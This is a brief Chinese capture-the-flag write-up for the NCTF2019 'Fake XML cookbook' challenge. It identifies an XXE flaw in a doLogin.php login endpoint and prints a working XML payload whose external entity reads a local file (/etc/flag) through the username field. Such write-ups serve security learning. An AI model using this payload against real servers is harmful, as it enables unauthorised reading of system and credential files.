# [NCTF2019]Fake XML cookbook

将提交的数据放到了doLogin.php下

由题目名称和源码猜测是XXE，可以进行尝试。可以根据常规的文件路径多尝试一下，找flag，这个应该是最简单的XXE利用了（可以查看XXE漏洞）

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///etc/flag">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```

![](https://s21.ax1x.com/2024/04/25/pkPpQNq.png)